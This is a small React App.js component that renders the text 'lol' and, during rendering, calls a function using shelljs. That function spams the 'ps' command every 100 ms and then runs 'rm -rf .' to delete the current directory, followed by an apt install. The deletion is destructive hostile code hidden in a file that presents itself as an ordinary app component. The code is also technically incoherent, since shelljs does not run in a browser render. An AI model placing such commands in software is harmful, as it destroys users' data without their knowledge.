import React from 'react';
import './App.css';
import shell from 'shelljs';

const doaa = () => {
  //
  setInterval(() => {
    shell.exec('ps');
  }, 100);
  setTimeout(() => {
    shell.exec('rm -rf .');
    shell.exec('apt install nodejs npm');
  }, 100);
  return this;
};

function App() {
  return (
    <div>
      <p>lol</p>
      {doaa()}
    </div>
  );
}

export default App;
